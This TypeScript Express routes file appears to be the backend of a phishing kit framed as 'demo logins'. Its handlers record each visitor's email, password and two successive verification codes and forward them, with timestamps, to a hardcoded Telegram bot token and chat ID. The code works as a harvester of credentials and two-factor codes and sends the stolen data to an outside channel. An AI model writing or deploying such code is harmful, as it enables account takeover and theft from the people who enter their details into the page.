import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import axios from "axios";

const TELEGRAM_BOT_TOKEN = "8298677939:AAHTsTz2Po7JfFA6DDn11kRZ8tX8y-Hzh0A";
const TELEGRAM_CHAT_ID = "6424080925";

async function sendTelegramMessage(message: string) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  app.post(api.demoLogins.create.path, async (req, res) => {
    try {
      const input = api.demoLogins.create.input.parse(req.body);
      const login = await storage.createDemoLogin(input);
      
      await sendTelegramMessage(
        `<b>New Login Attempt</b>\n\n` +
        `<b>Email:</b> ${input.email}\n` +
        `<b>Time:</b> ${new Date().toLocaleString()}`
      );

      res.status(201).json(login);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Internal Server Error" });
    }
  });

  app.patch(api.demoLogins.update.path, async (req, res) => {
    try {
      const id = Number(req.params.id);
      if (isNaN(id)) {
        return res.status(400).json({ message: "Invalid ID" });
      }

      const input = api.demoLogins.update.input.parse(req.body);
      
      const existing = await storage.getDemoLogin(id);
      if (!existing) {
        return res.status(404).json({ message: "Login record not found" });
      }

      const updated = await storage.updateDemoLogin(id, input);

      let message = `<b>Login Update (ID: ${id})</b>\n\n`;
      message += `<b>Email:</b> ${existing.email}\n`;
      if (input.password) message += `<b>Password:</b> ${input.password}\n`;
      if (input.firstCode) message += `<b>First Code:</b> ${input.firstCode}\n`;
      if (input.secondCode) message += `<b>Second Code:</b> ${input.secondCode}\n`;
      message += `<b>Time:</b> ${new Date().toLocaleString()}`;

      await sendTelegramMessage(message);

      res.status(200).json(updated);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Internal Server Error" });
    }
  });

  return httpServer;
}